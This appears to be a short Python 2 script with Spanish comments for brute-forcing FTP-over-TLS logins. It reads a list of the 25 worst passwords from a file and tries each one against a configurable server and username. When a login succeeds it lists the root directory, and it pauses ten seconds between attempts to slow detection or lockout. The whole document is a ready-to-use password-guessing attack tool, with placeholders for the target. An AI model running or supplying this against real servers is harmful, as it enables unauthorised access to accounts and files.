#!/usr/bin/python
#Script made by akil3s & @DaveLanis

import ftplib
from ftplib import FTP_TLS
import time

RUTA_SERVIDOR_FTP = 'yourserver_here' #change me
dict = open('25peores_pass.txt','r').readlines() # change the name of your dictionary in parentheses

def cliente_ftp_conexion(servidor, nombre_usuario, password):
#abrimos la conexion
	ftps = FTP_TLS(servidor)
	ftps.login(nombre_usuario, password)
	#ftp = ftplib.FTP(servidor, nombre_usuario, password)
	
#listamos los archivos de /
	ftps.cwd("/")
	print "Archivos disponibles en %s:" %servidor
	archivos = ftps.dir()
	print archivos
	ftps.quit()
	
 
if __name__ == '__main__':
	for line in dict:
		line = line.replace('\n',"")
		print line
		try:	
			cliente_ftp_conexion(servidor=RUTA_SERVIDOR_FTP, nombre_usuario='yourusername',password=line) # Change yourusername whiht the correct username
			time.sleep(10)
		except Exception, e:
			print e
			time.sleep(10)
